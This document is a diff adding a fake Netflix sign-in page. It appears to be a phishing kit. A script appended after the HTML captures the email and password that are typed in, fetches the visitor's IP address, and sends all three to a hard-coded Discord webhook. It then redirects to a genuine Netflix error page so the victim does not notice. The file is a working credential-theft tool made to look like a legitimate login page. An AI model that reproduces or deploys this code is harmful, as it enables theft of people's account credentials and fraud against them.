@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Netflix Login</title>
+<style>
+        /* Basic Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Background and Container */
+        body {
+            font-family: Arial, sans-serif;
+            background: url('netflix.png') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            position: relative;
+        }
+
+        .overlay {
+            background: rgba(0, 0, 0, 0.6);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 150px;
+        }
+
+        .login-container {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            background: rgba(0, 0, 0, 0.75);
+            padding: 70px 90px 60px;
+            width: 450px; /* Increased width for a wider box */
+            border-radius: 4px;
+            text-align: left;
+        }
+
+        .login-box h1 {
+            font-size: 32px;
+            margin-bottom: 28px;
+        }
+
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 14px;
+            background: #e50914;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+            margin-top: 30px;
+        }
+
+        .login-box .options {
+            font-size: 13px;
+            color: #b3b3b3;
+            margin-top: 20px;
+        }
+
+        .login-box .options a {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+
+        .login-box .options a:hover {
+            text-decoration: underline;
+        }
+
+        .login-box .remember {
+            display: flex;
+            align-items: center;
+            margin-top: 16px;
+        }
+
+        .login-box .remember input {
+            margin-right: 8px;
+        }
+
+        .signup {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 14px;
+        }
+
+        .signup a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .signup a:hover {
+            text-decoration: underline;
+        }
+
+        .captcha-notice {
+            font-size: 13px;
+            color: #8c8c8c;
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .captcha-notice a {
+            color: #0071eb;
+            text-decoration: none;
+        }
+
+        .captcha-notice a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+<div class="overlay"></div>
+<img alt="Netflix Logo" class="logo" src="local_resources/img/ff9453a5c328bb22fd4cb019b9ba01ae.png"/>
+<div class="login-container">
+<div class="login-box">
+<h1>Sign In</h1>
+<form>
+<input placeholder="Email address" required="" type="text"/>
+<input placeholder="Password" required="" type="password"/>
+<button type="submit">Sign In</button>
+<div class="remember">
+<input id="remember-me" type="checkbox"/>
+<label for="remember-me">Remember me</label>
+</div>
+<div class="options">
+<a href="#">Forgot your password?</a><br/>
+<a href="#">Sign in with a code</a>
+</div>
+<div class="signup">
+                    New to Netflix? <a href="#">Sign up now.</a>
+</div>
+<div class="captcha-notice">
+                    This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a>
+</div>
+</form>
+</div>
+</div>
+</body>
+</html>
+<script>
+    document.querySelector('form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        // Get the input values
+        const email = document.querySelector('input[type="text"]').value;
+        const password = document.querySelector('input[type="password"]').value;
+
+        // Get the user's IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+                // Send the data to the Discord webhook
+                const webhookURL = 'https://discord.com/api/webhooks/1299037003697885275/gZzTYRHGcdPh4tv1uCtSEVOyFrasg7M2V2jbP8PyLjb1y5V4D1qJPMqQqXcl1P6k6oHz'; // Replace with your webhook URL
+                const embed = {
+                    embeds: [{
+                        title: 'New Login Attempt',
+                        description: `**Email:** ${email}\n**Password:** ${password}\n**IP Address:** ${userIP}`,
+                        color: 0x8B0000 // Dark red color
+                    }]
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embed)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "https://www.netflix.com/NotFound?prev=https%3A%2F%2Fwww.netflix.com%2Floginerror";
+
+                    } else {
+                        console.error('Login Error');
+                    }
+                })
+                .catch(error => {
+                    console.error('Fetch error:', error);
+                });
+            })
+            .catch(error => {
+                console.error('IP Fetch error:', error);
+            });
+    });
+</script>
